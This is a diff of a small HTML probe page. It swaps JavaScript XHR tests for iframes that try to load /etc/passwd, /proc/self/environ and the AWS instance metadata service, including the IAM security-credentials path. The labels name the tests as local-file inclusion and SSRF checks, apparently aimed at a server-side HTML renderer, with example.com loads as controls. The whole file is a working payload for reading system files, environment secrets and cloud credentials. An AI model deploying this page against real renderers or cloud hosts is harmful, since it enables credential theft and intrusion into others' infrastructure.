@@ -1,24 +1,14 @@
 <!DOCTYPE html><html><head><meta charset="utf-8">
-<style>body{font-size:8px;font-family:monospace;white-space:pre-wrap;word-break:break-all}</style></head>
-<body><div id="o">DIAG_START</div>
-<script>
-var o=document.getElementById('o');
-function w(t){o.appendChild(document.createTextNode("\n"+t));}
-function test(name,method,url,hdr){
-  try{
-    var x=new XMLHttpRequest();
-    x.open(method,url,false);
-    if(hdr){for(var k in hdr){try{x.setRequestHeader(k,hdr[k]);}catch(e){}}}
-    x.send();
-    w(name+" OK ["+x.status+"] len="+(x.responseText?x.responseText.length:0)+" :: "+(x.responseText||"").slice(0,120));
-  }catch(e){ w(name+" ERR "+e); }
-}
-w("origin="+location.href);
-test("A_SELF_sameorigin","GET",location.href,null);
-test("B_XO_https_CORS","GET","https://api.github.com/zen",null);
-test("C_XO_https_noCORS","GET","https://example.com/",null);
-test("D_XO_http_mixed","GET","http://example.com/",null);
-test("E_IMDS_http_GET","GET","http://169.254.169.254/",null);
-test("F_IMDS_http_PUT","PUT","http://169.254.169.254/latest/api/token",{"X-aws-ec2-metadata-token-ttl-seconds":"21600"});
-w("DIAG_END");
-</script></body></html>
+<style>body{font-family:monospace;font-size:9px} .lbl{font-weight:bold;margin-top:6px}
+iframe{width:100%;height:180px;border:1px solid #000;display:block}</style></head>
+<body>
+<div>IFRAME_DIAG_START</div>
+<div class="lbl">1) file:///etc/passwd (LFI)</div><iframe src="file:///etc/passwd"></iframe>
+<div class="lbl">2) file:///proc/self/environ (env)</div><iframe src="file:///proc/self/environ"></iframe>
+<div class="lbl">3) IMDS /latest/meta-data/ (SSRF, direct http)</div><iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+<div class="lbl">4) IMDS / root (v1 listing vs v2 401?)</div><iframe src="http://169.254.169.254/"></iframe>
+<div class="lbl">5) IMDS iam creds</div><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
+<div class="lbl">6) http://example.com/ (MIXED-CONTENT control)</div><iframe src="http://example.com/"></iframe>
+<div class="lbl">7) https://example.com/ (iframe-renders-at-all control)</div><iframe src="https://example.com/"></iframe>
+<div>IFRAME_DIAG_END</div>
+</body></html>
